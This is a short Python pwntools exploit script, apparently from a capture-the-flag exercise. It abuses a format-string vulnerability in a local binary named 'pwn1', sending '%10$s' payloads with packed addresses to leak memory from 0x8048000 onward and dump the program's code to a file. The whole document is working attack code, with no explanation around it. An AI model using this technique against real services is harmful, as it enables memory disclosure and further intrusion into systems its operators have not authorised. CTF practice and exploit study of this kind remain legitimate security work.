#-*- coding:utf-8 –*-
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']

p = process("./pwn1")
f = open("pwn1bin", "ab+")

begin = 0x8048000
offset = 0
#i=0
p.recvuntil('Please tell me:')
while True:#i<13:#True:#
	addr = begin + offset	
	p.sendline("x%10$saaa" + p32(addr))
	try:
		#info = p.recv(4)

		info = p.recvuntil('aaa',drop=True)[10:]
		remain = p.recvrepeat(0.2)#weiba
		print info.encode("hex")
		print len(info)
	except EOFError:
		print "offset is " + str(offset)
		break
	if len(info)==0:
		print "info is null"
		offset += 1
		f.write('\x00')
	else:
		info += "\x00"
		offset += len(info)
		f.write(info)
		f.flush()
	#i = i + 1
	print "offset is " + str(offset)
f.close()
p.close()


